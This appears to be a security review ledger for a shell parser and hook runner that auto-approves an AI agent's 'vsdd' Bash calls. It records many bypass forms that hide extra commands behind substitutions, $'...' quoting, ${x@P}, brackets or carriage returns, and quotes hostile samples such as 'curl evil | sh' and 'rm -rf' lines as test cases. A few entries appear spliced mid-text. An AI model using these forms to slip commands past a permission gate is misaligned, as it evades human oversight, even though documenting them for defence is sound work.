problem: The fix for S3R-hook-runner-C1-1 made a command substitution invisible when an arithmetic span shares its word. _read_word assigns 'subst = _arithmetic_nests_substitution(...)' instead of OR-ing it in, so a '$(' or backtick that comes earlier in the same word is forgotten. And _own_opacity skips any argument that contains '$((' anywhere. So 'echo $(rm -rf /tmp/x)$((1+2))', 'echo "$(id)$((1))"', 'echo `id`$((1))', 'X=$(id)$((1)) ls' and 'echo > $(id)$((1))' now all parse as not opaque. Before this round they were opaque. The form '$((cmd) )' is also not opaque, and sh and bash run it as a command substitution ('sh -c "echo $((echo hi) )"' prints hi). Through the runner, an agent's Bash call 'vsdd survey $(echo pwned > /dev/null)$((1))' gets the caller marker and permissionDecision 'allow' with updatedInput, and so does 'vsdd survey $((echo pwned) )'. HD8 says the decision sent with the rewrite approves the whole command, so the command may hold nothing else. Here it approves an arbitrary command substitution without a prompt for agents and in auto or bypassPermissions mode. No test covers a substitution and an arithmetic span in one word.
proposed_resolution: In _read_word, OR the arithmetic result into subst in both the bare and the double-quoted path ('subst = subst or _arithmetic_nests_substitution(...)'). In _own_opacity, drop the per-argument '$((' exclusion and rely on the word's subst flag. Or remove only the arithmetic spans that nest nothing before looking for '$(' or a backtick. Treat a '$((' span that does not close with '))' as a command substitution (sh and bash run '$((cmd) )'). The simplest safe form: an arithmetic span counts as harmless only when it closes with '))' and its inner text uses only arithmetic characters (digits, names, $name, operators, blanks, parentheses). Add to test_shell.py the opaque cases 'echo $(id)$((1))', 'echo "$(id)$((1))"', 'echo `id`$((1))', 'X=$(id)$((1)) ls', 'echo > $(id)$((1))' and 'vsdd survey $((id) )'. Add a runner test in test_caller.py: an agent's 'vsdd survey $(id)$((1))' gets no marker and no decision. While there: a '${...}' span holding '$(' sets no subst, so 'X=${y:-$(id)} ls' and 'echo > ${y:-$(id)}' are not opaque either. That gap is older than this round. Arguments are covered by _own_opacity, but the program word, assignment values and redirect targets are not.

outcome.what_was_done: In _read_word's double-quote branch, a ${ now takes the plain-text rule: _parameter_plain runs on the text up to the first '}', and when there is no closing brace, or the inner text is not plain (a nested quote, a backslash, a parenthesis, an @ or ! operator), the word counts a substitution. The finding's forms all parse opaque now: the nested-quote forms 'vsdd survey "${x:-"'"}"$(id)''' and 'vsdd survey "${x:-'"'}"$(id)"}', the zsh nest 'vsdd survey "${(e):-\$(id)}"' and the double-quoted setter 'vsdd survey "${x:=\$(id)}${x@P}"' (and the setter feeding ${!x} or $((x))), which through the runner had got the marker, 'allow' and updatedInput. 'vsdd survey "${x:-a b}"' stays judgeable inside quotes. Proof: removing the branch in a scratch copy fails test_parameter_span_inside_double_quotes_counts_substitutions and, with the parser reverted, the runner refusals fall back to the allow-list alone (the ORCH-2 runner test still passes: the two layers hold independently).

problem: The fix for S3R-hook-runner-6 sets _Word.subst for any word that opens with '$(' and marks the segment opaque on it. That includes arithmetic expansion: 'echo $((1+2))' and "git commit -m \"$((1+2))\"" now parse as opaque. _own_opacity still excludes '$((' explicitly, and the module docstring says plain expansions are not opaque. The exclusion is now dead code and the two statements disagree. A vsdd call with an arithmetic argument no longer gets its caller marker.
proposed_resolution: Decide on one behaviour. Either set subst for '$((' only when the arithmetic contains a '$(' or a backtick, or drop the '$((' exclusion from _own_opacity and say in the docstring that arithmetic is opaque. Add 'echo $((1+2))' to test_substitution_in_any_word_is_opaque with the expected answer.

outcome.what_was_done: Settled on: arithmetic is opaque only when it nests a command substitution. _read_word distinguishes '$((' from '$(': an arithmetic span sets word.subst only when its interior ('$(', '`') holds a command substitution or a backtick, in the bare and the double-quoted forms alike; _own_opacity's '$((' exclusion is no longer dead code but the other half of the same decision, and the module and _Word docstrings say so. 'echo $((1+2))', quoted 'n=$((1+2))' and a vsdd call with an arithmetic argument stay judgeable, so the caller marker survives; '$(($(wc -l)+1))' and a backtick inside the arithmetic are opaque. Verified by mutation: forcing subst for arithmetic fails the test.

problem: This gap is older than this fix round; the confirmation found it. _read_word reads '$'' as a literal '$' followed by a POSIX single-quoted string that ends at the next quote. bash (also when it runs as macOS /bin/sh) and zsh read $'...' as ANSI-C quoting, where a backslash escapes a quote. So "\'" does not end the string, and the two readings disagree on where the string stops. Two forms parse as one segment, not opaque, with is_vsdd_call True: "vsdd survey $'\'' ; id #'" and "vsdd survey $'\'';id;'x'". The parser reads ' ; id #' as quoted text, while the shells end the string at the second quote and run id as a separate command. Both ran id under /bin/sh, /bin/bash 3.2, bash 5.3 and zsh; dash reads the POSIX way and did not. Through the runner, an agent's call got the caller marker, permissionDecision 'allow' and updatedInput, which HD8 forbids.
proposed_resolution: Count any $' outside double quotes as a substitution, because the shells disagree on where it ends. A narrower option is to read it as ANSI-C text and count it only when its content holds a backslash. Add "vsdd survey $'\'' ; id #'" and "vsdd survey $'\'';id;'x'" to test_shell.py as opaque, and the first to the agent cases of test_decision_pairing (no marker, no decision).

outcome.what_was_done: A dollar sign followed by a single quote, outside double quotes, now counts a substitution in _read_word's bare branch, because bash and zsh read $'...' as ANSI-C quoting where \' does not end the string while dash reads the POSIX way — the shells disagree on where the string ends, so it is never plain text. Both recorded forms, "vsdd survey $'\'' ; id #'" and "vsdd survey $'\'';id;'x'", parse opaque instead of one plain vsdd call that runs id under sh, bash and zsh. Proof: deleting the branch in a scratch copy fails test_dollar_quote_counts_a_substitution.

problem: This fix round added _parameter_plain, whose plain-character set includes '@', so ${name@P} reads as plain. In bash 4.4 and later, @P expands a variable's value as a prompt string, and prompt expansion runs any $(...) in it. No setter is needed: under bash -c, BASH_EXECUTION_STRING holds the command text itself. So "vsdd survey '$(id)' ${BASH_EXECUTION_STRING@P}" parses as one non-opaque vsdd call, and bash 5.3 runs the single-quoted $(id). It then recurses through the same expansion until killed. Inside an eval wrapper like the Bash tool's, it ran the hidden command 966 times in five seconds. Through the runner, an agent's call got the caller marker, permissionDecision 'allow' and updatedInput. macOS /bin/bash 3.2 has no @P, but a bash user on Linux does. '!' is also on the list: ${!x} is indirect expansion, which bash evaluates through array subscripts. Once the double-quoted ${...} hole in S3R-hook-runner-C2-1 is closed, only an inherited value can feed ${!x}.
proposed_resolution: Drop '@' from _PARAM_PLAIN_CHARS. Then ${@} and ${#@} read as opaque, which is safe. Alternatively, treat any '@' after the parameter name as not plain. Consider dropping '!' as well. Add "vsdd survey '$(id)' ${BASH_EXECUTION_STRING@P}" and 'vsdd survey ${x@P}' to test_shell.py as opaque, and the first to the agent cases of test_decision_pairing. A scratch sketch that dropped '@' kept all 130 tests under tests/hooks passing.

outcome.what_was_done: Dropped '@' and '!' from _PARAM_PLAIN_CHARS, with the reason at the set: bash 4.4+'s ${name@P} expands the value as a prompt string and runs any $(...) in it (BASH_EXECUTION_STRING holds the command itself under bash -c), and ${!x} is indirect expansion through array subscripts. "vsdd survey '$(id)' ${BASH_EXECUTION_STRING@P}", 'vsdd survey ${x@P}', 'vsdd survey ${!x}' and the double-quoted setters feeding them parse opaque now, where through the runner they had got the marker, 'allow' and updatedInput; ${@} reading opaque is the safe side. Proof: restoring '@!' to the set in a scratch copy fails test_prompt_and_indirect_parameter_operators_count_substitutions.

problem: This gap is older than this fix round; the confirmation found it. _read_word reads a '[' bracket expression whole, to the next ']', with text.find. That swallows blanks, joiners, '$(' and backticks into one literal word. In every shell a metacharacter ends a word whatever brackets are open, so the shell sees separate commands that the parser hides. 'vsdd survey [ ; rm -rf /tmp/x ; ]', 'vsdd survey [;id;]', 'vsdd survey [ && curl evil | sh ]' and 'vsdd survey a[b|id]' each parse as one segment, not opaque, and is_vsdd_call is True. Substitutions inside the brackets are hidden the same way: 'vsdd survey [$(id)]' and 'vsdd survey [`id`]'. So is bash and zsh arithmetic '$[$(id)]', where the '$' is appended and the '[' branch swallows the rest. All of these ran their hidden command or substitution under /bin/sh, /bin/bash 3.2 and bash 5.3, and most did under dash and zsh too ('echo H [ ; echo PWNED ; ]' prints PWNED). Through the runner, an agent's call in each form got the caller marker, permissionDecision 'allow' and updatedInput. HD8 forbids this: the approved command may hold nothing else, and here it holds arbitrary commands, approved without a prompt for agents and in auto or bypassPermissions mode.
proposed_resolution: Remove the bracket-expression branch: a '[' only marks the word expanded, and the loop goes on, so blanks, joiners, '$(' and backticks after it are read as they are everywhere else. Treat '$[' as a substitution: bash and zsh arithmetic expands '$(...)' inside it, and its extent is not the word loop's. Add these to test_shell.py as several segments or opaque: 'vsdd survey [ ; id ; ]', 'vsdd survey [;id;]', 'vsdd survey [ && id ]', 'vsdd survey a[b|id]', 'vsdd survey [$(id)]', 'vsdd survey [`id`]' and 'vsdd survey $[$(id)]'. 'vsdd survey a[bc]' stays a judgeable vsdd call. Add agent cases to test_caller.py::test_decision_pairing: no marker, no decision. In a scratch copy, removing the branch left all 128 tests under tests/hooks passing.

outcome.what_was_done: The double-quote branch of _read_word now counts a '$[' as a substitution, as the unquoted branch already does, so an escaped \$ inside the span hides nothing: 'vsdd survey "$[a[\$(id)]]"' parses opaque instead of one plain vsdd segment that runs id under sh and bash via the doubly-expanded array subscript. Added to test_brackets_split_or_are_opaque, and the form is among the runner-as-agent refusals. Proof: deleting the branch in a scratch copy fails that test.

problem: This gap is older than this fix round; the confirmation found it. The lexer treats a carriage return as a blank, and _WORD_END holds it too. sh, bash, dash and zsh treat it as an ordinary word character. So in 'vsdd survey \r#; rm -rf /tmp/x' the parser reads '#' as the start of a comment and drops '; rm -rf /tmp/x': one segment, not opaque, and is_vsdd_call is True. The shells read '\r#' as a word, then the ';' joiner, then run the second command: printf 'echo hi \r#; echo PWNED' piped to each of the four shells prints PWNED. A Bash tool command is JSON, so an agent can put a carriage return in it. The runner would then approve the hidden command with the caller marker and 'allow', the same HD8 breach as C2-1.
proposed_resolution: Remove '\r' from the lexer's blank set (' \t') and from _WORD_END, so a carriage return is a word character as it is in every shell. Add test_shell.py cases: 'vsdd survey \r#; id' parses as two segments and is no vsdd call, and 'echo a\rb' is one word.

outcome.what_was_done: '\r' is removed from the lexer's blank set and from _WORD_END, so a carriage return is the ordinary word character sh, bash, dash and zsh read: 'vsdd survey \r#; id' now parses as two segments ('\r#' is a word, so '#' starts no comment and the second command is seen) and is_vsdd_call is False - an agent cannot hide a command behind a carriage return any more. New test test_shell.py::test_carriage_return_is_a_word_character asserts the two-segment parse with programs ['vsdd', 'id'] and that 'echo a\rb' is one word ('a\rb'). An agent case ('vsdd survey \r#; id') was added to test_caller.py::test_decision_pairing: no marker, no decision. Mutation check (scratch copy): restoring '\r' to the blank set and _WORD_END fails the test (the parse collapses to one segment again).

problem: This is related to S3B-hook-runner-3, whose stated forms ('2>log cmd', '>out cmd arg', '2>&1 cmd', '<in cmd') now parse correctly. _redirect_op accepts only a single fd digit hugging a redirect operator. So '10>/dev/null git push --force origin main' parses as program '10' with args ('git', 'push', ...), and 'git 10>/dev/null push' gets args ('10', 'push'). POSIX lets an io_number be any digits, and /bin/sh and bash honour '10>' as a redirect and run 'git push'; dash and zsh run '10' as a program. A future Bash rule that judges the program or its first argument would miss 'git push' in that form. The caller marker is not affected, because a segment with a redirect is never a vsdd call.
proposed_resolution: Let any run of digits hugging a redirect operator be its fd. That is the safe reading: a rule then sees the real program, and under dash or zsh such a command only fails to find a program named with digits. Add '10>/dev/null cmd arg' to test_leading_redirect_before_the_program: program 'cmd', args ('arg',), redirect ('10>', '/dev/null').

outcome.what_was_done: _redirect_op now lets any run of digits hugging a redirect operator be its fd, as POSIX io_number allows: the 'probe - index == 1' restriction is gone, the op carries the whole digit run ('10>'), and the lexer's digit-lookahead condition (the new _fd_hugs_redirect) scans the whole run before checking for '<>' - previously '10>/dev/null cmd arg' entered no redirect branch at all because only one digit was peeked. '10>/dev/null cmd arg' parses as program 'cmd', args ('arg',), redirect ('10>', '/dev/null'), so a future Bash rule judges the real program; under dash and zsh the command only fails to find a program named with digits, the safe reading. Added to test_shell.py::test_leading_redirect_before_the_program. Mutation checks (scratch copy): restoring 'probe - index == 1' in _redirect_op, and restoring the single-char peek in the lexer condition, each fail the test.

problem: The program alternative [A-Za-z0-9_@%+:,./-]+/vsdd lets the path start with '%', '-' or '+'. bash 3.2, bash 5.3, macOS /bin/sh and zsh 5.9 read a first word that starts with '%' as a job spec. So 'VSDD_CALLER=<key> %/vsdd survey' runs the fg builtin, not the path: the shell prints 'fg: no job control', or 'no such job' under set -m. Only dash runs the path. Through the runner, an agent's '%/vsdd survey' gets the caller marker, permissionDecision 'allow' and updatedInput for a command that does not run vsdd. No probe ran anything harmful, because a fresh shell has no job to resume. Still, this is the gap step3-hook-runner-fix-4-C1-1 closed for '=': the spec's reason there is that the shell must run the path. A path that starts with '-' or '+' does run, but bin/vsdd is a '#!/bin/sh' script. The kernel passes the path to sh as its first argument, and sh reads it as options ('-/: invalid option'). Such a call is approved and can never work. In a four-shell canary sweep of 1851 accepted texts, these were the only ones that did not run the vsdd canary exactly once.
proposed_resolution: Let the program path start only with a letter, a digit, '_', '.' or '/', for example (?:vsdd|[A-Za-z0-9_./][A-Za-z0-9_@%+:,./-]*/vsdd). Say in caller-identity.md that the path does not start with '%', '-' or '+', and why. Add '%/vsdd survey', '%1/vsdd x', '-x/vsdd survey' and '+/vsdd survey' to REFUSED_CALLS, which the regex-alone test then covers, and to test_refused_bypass_forms_pass_unmarked_through_the_runner.

outcome.what_was_done: The program alternative of _CALL_TEXT_RE in caller.py now begins the path with a letter, a digit, '_', '.' or '/' — (?:vsdd|[A-Za-z0-9_./][A-Za-z0-9_@%+:,./-]*/vsdd) — so a first word beginning with '%' (a job spec in bash 3.2, bash 5.3, macOS /bin/sh and zsh, which run the fg builtin instead of the path) and a path beginning with '-' or '+' (the /bin/sh interpreter of a #!/bin/sh script reads the word as options, so the call is approved and can never work) are refused. The code comment in caller.py states the rule and the reason, and the grammar passage of rewrite/spec/topics/caller-identity.md now says the path begins with a letter, digit, '_', '.' or '/', with the reason. REFUSED_CALLS gains '%/vsdd survey', '%1/vsdd x', '-x/vsdd survey' and '+/vsdd survey'; the runner test test_refused_bypass_forms_pass_unmarked_through_the_runner sends all four through the gate as an agent. Proof: with the pre-fix caller.py restored (scratch copy), the three tests fail — the refusal table, the regex-alone table and the runner test, which records the marker, permissionDecision 'allow' and updatedInput that '%/vsdd survey' drew from the pre-fix code. A canary sweep over 318 grammar-accepted texts (program forms vsdd, ./vsdd, sub/vsdd, 1/vsdd, _x/vsdd, .x/vsdd, x.y/vsdd; bare words; single-quoted spans holding spaces, non-ASCII and shell metacharacters; name='value' forms; space/tab padding) ran under /bin/sh, /bin/bash 3.2, bash 5.3, /bin/dash and /bin/zsh: each text ran the vsdd canary exactly once and no decoy ever ran, with a per-shell negative control proving the harness records hidden runs.
outcome.where: next/plugins/vsdd-factory/py/vsdd/hooks/caller.py (_CALL_TEXT_RE program alternative, _QUOTED area comments); rewrite/spec/topics/caller-identity.md (grammar passage, the program bullet); next/tests/hooks/test_caller.py (REFUSED_CALLS, test_refused_bypass_forms_pass_unmarked_through_the_runner)

problem: The unit's brief asks that every bypass command the ledger records for this unit become a test case. Each case must show that an agent's call in that form gets no caller marker and no permission decision. LEDGER_BYPASS_FORMS holds 31 forms, but only 11 go through the runner as an agent, in test_refused_bypass_forms_pass_unmarked_through_the_runner and test_decision_pairing. The other 20 are checked only through is_vsdd_call and the regex. They include forms the ledger says got the marker, 'allow' and updatedInput through the runner: 'vsdd survey "${x:-"'"}"$(id)''', 'vsdd survey "${(e):-\$(id)}"', "vsdd survey $'\'';id;'x'", 'vsdd survey ${x@P}' and 'vsdd survey [ && id ]'. The form S3R-hook-runner-C2-1 records exactly, 'vsdd survey $(echo pwned > /dev/null)$((1))', is not in the tests at all. In a scratch run, all 31 forms and that one passed through the runner as an agent with no marker and no output. The gap is in the tests, not in the code.
proposed_resolution: Make test_refused_bypass_forms_pass_unmarked_through_the_runner send every LEDGER_BYPASS_FORMS entry through the gate as an agent, as well as its own list. Add 'vsdd survey $(echo pwned > /dev/null)$((1))' under S3R-hook-runner-C2-1.

outcome.what_was_done: test_refused_bypass_forms_pass_unmarked_through_the_runner now sends every LEDGER_BYPASS_FORMS entry through the gate as an agent — all 32 forms of the four finding ids, in place of the 11 that went through the runner before — together with its own runner cases: the single-quote junk of ORCH-2, 'vsdd survey "x"', the assignment programs of step3-hook-runner-fix-4-C1-1 and the %-/-/+ program starts of step3-hook-runner-fix-4-C2-1 (40 distinct commands, deduplicated in order). LEDGER_BYPASS_FORMS gains the exact form S3R-hook-runner-C2-1 records, 'vsdd survey $(echo pwned > /dev/null)$((1))', under its id. Each case asserts the hook exits 0 with no stdout (no permissionDecision, no updatedInput) and the test asserts no marker file is written. All 40 pass unmarked and undecided; the code needed no change, as the confirmation already found.

problem: The program alternative of the allow-list is (?!=)[SAFE]+/vsdd, and SAFE holds '='. So a first word shaped like an assignment matches, for example 'FOO=/vsdd id' or 'a=b/vsdd survey'. A shell reads that word as an assignment, and the command it runs is the next word ('id', 'survey'), not vsdd. The text grammar alone therefore does not make sure the program is vsdd. Only the parser's check for a leading assignment refuses these today. The spec repeats the gap: 'a path of safe characters that ends in /vsdd' allows '='.
proposed_resolution: Leave '=' out of the program's characters, for example (?:vsdd|[A-Za-z0-9_@%+:,./-]+/vsdd). Say in caller-identity.md that the program path holds no '='. Add 'FOO=/vsdd id' and 'a=b/vsdd survey' to the refused table, and assert that caller._CALL_TEXT_RE.fullmatch refuses them on its own.

outcome.what_was_done: Left '=' out of the allow-list's program characters: the program alternative is now (?:vsdd|[A-Za-z0-9_@%+:,./-]+/vsdd), so a first word shaped like an assignment can no longer match — 'FOO=/vsdd id' and 'a=b/vsdd survey', which a shell reads as an assignment followed by the command it runs ('id', 'survey'), are refused by the regular expression alone instead of only by the parser's leading-assignment check. The comment at the pattern and the comment beside _SAFE say why. The spec states the fact in the one place that owns it: rewrite/spec/topics/caller-identity.md's grammar bullet now reads 'a path of safe characters that ends in /vsdd and holds no =', with the reason in parentheses. Both forms joined the refused table and the runner test, so an agent's call in either form is shown to get no marker, no permissionDecision and no updatedInput; test_allow_list_regex_refuses_the_tables_on_its_own asserts caller._CALL_TEXT_RE.fullmatch refuses them without the parser. Proof by mutation: with the pre-fix caller.py restored, the table, regex-alone and runner tests fail on these forms; with the fix all pass. The four-shell canary sweep also covers assignment-shaped first words: no text the fixed grammar accepts runs anything but the vsdd canary under sh, bash, dash and zsh.

where: next/tests/hooks/test_caller.py (test_property_junk_from_excluded_characters_never_approves, the between-quotes position and its comments)
problem: The fix makes every between-quotes draw carry one character from the single quote, U+0000 to U+001F and U+007F. A new comment says this means 'no draw can be a correct plain call whatever the seed'. That is false. The single quote and the tab are refused only inside a span. A drawn or inserted quote can close the span, and a drawn or inserted tab is then a legal separator before a second quoted argument. Seeds 4050 and 19019 both draw vsdd survey --flag value 'x'<TAB>'', which is a correct plain call. The grammar accepts it, the parser reads the arguments survey, --flag, value, x and an empty string, and sh, bash 3.2, bash 5.3, dash and zsh all run vsdd with exactly those arguments. With the code unchanged and the seed tuple set to (4050, 19019), the test fails on that text. The six seeds in the file pass only because they draw no such text, and 2 of seeds 0 to 19999 do. problem: The fix rebuilt the property test's fourth position as base + " 'x" + junk + "'", with the junk drawn from an alphabet that holds the printable excluded characters as well as the single quote, the control characters and DEL. The test asserts that no such text is ever approved. That is false whenever a draw happens to hold no single quote, no control character and no DEL: printable excluded characters are legal inside a single-quoted span, so for example vsdd survey --flag value 'x$!' is a correct plain call. The grammar accepts it, the parser finds one plain segment, and /bin/sh runs vsdd with the literal argument x$!. The test passes only because the fixed seed 20261124 happens to give no clean draw in its 57 fourth-position cases. With the code unchanged, changing the seed to 1, 2, 3, 42 or 20261125 makes the test fail on correct texts ('x$!', 'x<"', 'x*', 'x*}', 'x<<'). The construction it replaced passed under all of those seeds. So any later change to the draw order, the number of draws or the alphabets can turn the test red with no fault in the code. The comments are wrong too: they say 'no character of the junk may sit inside a quoted span' and call the alphabet 'what a quoted span must refuse'. The per-character pinning is weak as well. With the seed as it is, letting U+0001 alone into _QUOTED keeps all 76 tests in test_caller.py, test_shell.py and test_runner.py passing. Only six control characters are pinned by table rows.
proposed_resolution: Make every between-quotes draw carry at least one character a quoted span refuses. Draw the junk from the current alphabet, then insert one character drawn from the single quote, U+0000 to U+001F and U+007F at a random index. Then assert the precondition inside the test, for example that some character of inner is a quote, below U+0020 or U+007F, and correct the two comments. To pin every control character deterministically rather than by chance, add a loop that asserts vsdd survey 'a<c>b' is refused, by is_vsdd_call and by caller._CALL_TEXT_RE alone, for every code point c in U+0000 to U+001F and U+007F. Check that the test passes under several seeds before keeping one.

No other test puts a non-ASCII code point outside a quoted span. The only other non-ASCII code points inside one are e-acute, u-umlaut and i-umlaut. So widening or narrowing a character class with any other non-ASCII code point passes all 27 tests. I ran 1163 mutants of caller.py in a scratch copy of next/. These were killed: all 1032 per-character ASCII widenings and narrowings of the program's first class, its rest class, _SAFE, the separator, both pads and the quoted span; all 53 recorded mutations (the 49 and their variants); the pre-fix 'head required' revert; and every look-ahead, quantifier, structure and gate change. 70 survived. Two are equivalent mutants and need no test: [SAFE]*= changed to [SAFE]+= after (?!=), and the bare word's + changed to *. Neither differs from the current regex on any of 1,069,774 texts. The other 68 are real. (1) 54 mutants add one of U+00A0, U+1680, U+2002, U+202F, U+3000, U+FEFF, U+200B, U+4E2D or U+1F600 to the program first class, the program rest class, _SAFE, the separator, the leading blanks or the trailing blanks. where: next/tests/hooks/test_caller.py (_checker_program_word, used by test_grammar_checker_agrees_with_the_allow_list); the rule is the program alternative of _CALL_TEXT_RE in next/plugins/vsdd-factory/py/vsdd/hooks/caller.py; the grammar is in rewrite/spec/topics/caller-identity.md
problem: The independent checker was meant to follow caller-identity.md sentence by sentence. At one point it follows caller.py instead. Its docstring adds 'The path form carries at least one character before the final /vsdd', and the code has 'len(word) <= 5'. The spec says nothing of the kind. It says the program is vsdd or 'a path of safe characters that ends in /vsdd', holds no '=' and begins with a letter, a digit, '_', '.' or '/'. The word /vsdd meets every one of those conditions. The regex [A-Za-z0-9_./][A-Za-z0-9_@%+:,./-]*/vsdd needs a character before the final '/vsdd', so it refuses '/vsdd survey' while it accepts '//vsdd survey', which names the same program. The parsed gate alone would accept '/vsdd survey' (program /vsdd, basename vsdd). No reason is given anywhere for refusing it. I compared my own literal reading of the spec, a deterministic token walk, with the regex over 657,186 texts. These were single-character inserts, replacements and deletions of every base and table row, two-character edits and 300,000 random texts. The two disagree on 283 texts, and every one has the program /vsdd. The fixer's checker agrees with the regex on all of them, because of the added rule. So the fixer's claim that the regex and a spec-faithful checker agree everywhere is not quite true. The differential test now pins a behaviour the spec does not state. A mutant that makes the regex accept /vsdd, with the program head made optional, brings the code in line with the spec text, yet it fails test_grammar_checker_agrees_with_the_allow_list. Refusing the call is the safe side: an agent's '/vsdd survey' passes unmarked, and survey then refuses to start. In practice nothing installs vsdd at '/'. The gap is that the spec and the code disagree and the test hides it.
proposed_resolution: Make the spec and the code say one thing, then let the checker follow the spec. Preferred: accept a bare /vsdd. Change the program alternative to (?:vsdd|(?:[A-Za-z0-9_./][A-Za-z0-9_@%+:,./-]*)?/vsdd), drop the 'len(word) <= 5' rule and its docstring sentence from _checker_program_word, and add '/vsdd survey' to ALLOWED_CALLS and DIFFERENTIAL_BASES. A bare /vsdd is a plain absolute path with no special reading in sh, bash, dash or zsh, exactly like //vsdd, which is already accepted. Alternative: if /vsdd must stay refused, state the rule and its reason in caller-identity.md's program bullet, have the checker cite that sentence, and add '/vsdd survey' to REFUSED_CALLS so the rule is named. Either way, re-run the differential and the mutation battery.

outcome.what_was_done: Made the spec, the code and the checker say one thing about the bare /vsdd, taking the finding's preferred option. caller.py: the program alternative of _CALL_TEXT_RE is now (?:vsdd|(?:[A-Za-z0-9_./][A-Za-z0-9_@%+:,./-]*)?/vsdd) — the character run before the final /vsdd is optional, so the bare /vsdd, a path of safe characters that begins with / and holds no =, is accepted, as the spec's program rule already read; the code comment states the rule and the reason (an ordinary absolute path in sh, bash, dash and zsh, exactly like the //vsdd that was already accepted). Exactly what was wrong with the regex: it demanded one character strictly before the final /vsdd, a rule the spec does not state, refusing /vsdd survey while accepting the same program as //vsdd survey. test_caller.py: _checker_program_word follows the spec sentence by sentence now — the len(word) <= 5 rule and its docstring sentence are gone, the first-character class is checked on the word and the = check runs over the whole head, so the empty head of /vsdd is admitted; /vsdd survey joined ALLOWED_CALLS and DIFFERENTIAL_BASES; the differential test gained the deletion arm the confirmation used (deleted, inserted and replacing text at every index), and its docstring cites the finding. caller-identity.md's program bullet now says outright that the path may be the bare /vsdd, so the unstated length rule cannot quietly return. spec_lint.py: 0 problem(s). Re-ran the differential: over all 112 base and table rows with every deletion, insertion and replacement at every index, 578,600 texts, plus 300,000 random texts over all of ASCII, the quote and the controls — 0 disagreements between the regular expression and the checker, where the confirmation found 283 (all with program /vsdd). Re-ran the mutation battery in a scratch copy of next/ (restored byte-identically after each run): 114 mutations — every quoted-span widening per code point plus the single quote (34), the program first and rest classes each widened with the excluded characters, the quote and = (48), narrowings dropping one character from each class (16), the head-required pre-fix program revert and the path-form-only variant (2), separator + to star and CR/LF/FF/VT (5), pads widened with CR and LF (2), the three look-ahead drops (3), _SAFE widened with $, ( and " (3), and the raw-text gate relaxed from fullmatch to match (1) — and every one fails at least one test of test_caller.py. The pre-fix regex revert fails on the /vsdd survey rows of the allowed table and the differential, so the pin now sits on the spec's side. The widening admits only texts the spec already admitted: a program word of safe characters, no =, led by a letter, digit, _, . or /, which the parsed second gate then judges as before.

problem: wiring() writes the wrong document as soon as a rule names any event but the two current duties. (a) It drops the matcher of every event except PreToolUse: a row on UserPromptExpansion, SubagentStart or SubagentStop gets a handler with no matcher key, so it fires on every prompt expansion and every subagent instead of on ^vsdd-factory:decide$ or ^vsdd-factory:|^workflow-subagent$ (verified by generating wiring for such rows). H7's decisions gate (step 4) would then run, with onFailure block, on every slash-command expansion. (b) EventSpec.is_async is never written, so SubagentStart would be wired synchronously although tables/events.toml says async = true. (c) A PreToolUse row with no atoms means every call of the event and select() picks it for Read, but wiring adds no atom for it, so hooks.json carries only the atoms other rows and duties name (here Bash) and the rule never runs for any other tool. test_shape checks only the two current duties, and test_reachability skips rows with empty atoms and tests atoms by substring, so it cannot catch any of this.
proposed_resolution: In _wire_entry use the EventSpec's own matcher for every event with a fixed matcher that is not PreToolUse. Emit "async": true when is_async. For PreToolUse, use the full TOOL_ATOMS matcher when any selected row names no atoms. Extend test_shape and test_reachability to generate wiring from a fixture table with one row per event plus an every-tool PreToolUse row, and to check reachability with re.fullmatch of the wired matcher against every tool select() picks.

outcome.what_was_done: wiring() now writes the event's own fixed matcher for every wired event but PreToolUse (UserPromptExpansion gets ^vsdd-factory:decide$, SubagentStart and SubagentStop get ^vsdd-factory:|^workflow-subagent$), emits handler async: true when the event row's is_async is set, and gives PreToolUse the full TOOL_ATOMS matcher when any PreToolUse row names no atoms. The checked-in hooks.json is byte-identical (build.py --check passes) because at this depth only the two duties are wired. New lint test drives wiring from a fixture table covering every event plus an every-tool row, and checks reachability with re.fullmatch against sample tool names.

problem: TOOL_ATOMS is EVENTS[2].matcher.split("|"), which also splits inside the two MCP groups. The result is 21 entries, among them broken fragments such as 'mcp__(plugin_vsdd-factory_)?playwright__browser_(navigate', 'tabs', 'mcp__(plugin_vsdd-factory_)?(perplexity' and 'context7)__.*'. wiring() refuses a rule that names the design's MCP atom 'mcp__(plugin_vsdd-factory_)?(perplexity|tavily|context7)__.*' as 'not a tool atom'. It accepts 'tavily', but select('PreToolUse', 'mcp__tavily__search') never picks that rule, and matches() hides the re.error the fragments raise. Plan 3.3 promises that a rule names an atom by its text. test_shape's '|'.join(TOOL_ATOMS) == DESIGN_MATCHER is an identity and cannot fail. secrets and read-walls cannot be wired to the research and Playwright tools.
proposed_resolution: Declare TOOL_ATOMS as the explicit 16-entry tuple and build the PreToolUse matcher as '|'.join(TOOL_ATOMS). Add tests: there are 16 atoms; every atom compiles; each MCP atom selects mcp__tavily__search and mcp__plugin_vsdd-factory_playwright__browser_navigate; a fragment such as 'tabs' is refused.

outcome.what_was_done: TOOL_ATOMS is now the 16 atoms declared explicitly, and EVENTS' PreToolUse matcher is '|'.join(TOOL_ATOMS) — never a split of the joined matcher, so the MCP groups stay whole. test_shape asserts the count of 16, that every atom compiles, and that the MCP atoms select their tools (mcp__tavily__search, mcp__context7__..., both playwright forms) and reject a foreign server.

problem: HD3 and the failure table of topics/hook-failure.md are not met outside gate mode, in both directions. (1) The deadline appends Block('runner_timeout') in every mode, so brief and notify exit 10, which the launcher maps to 2. On SessionStart this puts a block on stderr and no fallback briefing, because emit.finish returns as soon as it sees a block. On SubagentStop (4 s deadline, notify mode) it refuses the stop and traps the agent, which topics/hook-wiring.md rules out. Verified: both modes return 10 with the block text. (2) In brief mode a crashing rule adds nothing to outcomes, because _rule_crashed appends only for gate plus closed. _is_crash therefore never fires and the fallback line is never printed. A crashing session-briefing gives a silent session start (verified: (0, '', '') for fail open and fail closed). test_deadline covers gate only, and deleting the fallback append fails no test. Also, a _Deadline that arrives while _rule_crashed or ctx.log runs inside the except handler escapes the loop and crashes the runner.
proposed_resolution: Add the runner_timeout Block only when mode == 'gate'. In the other modes log rule.timeout and, in brief, append the fallback Context. Trigger the fallback from a flag set whenever this call logs a rule.error or rule.timeout, not from Block codes. Cancel the timer, or guard the handler, before the crash logging runs. Add tests for a deadline and for a crash in brief mode (exit 0, fallback JSON with systemMessage) and in notify mode on SubagentStop (exit 0, nothing on stdout or stderr).

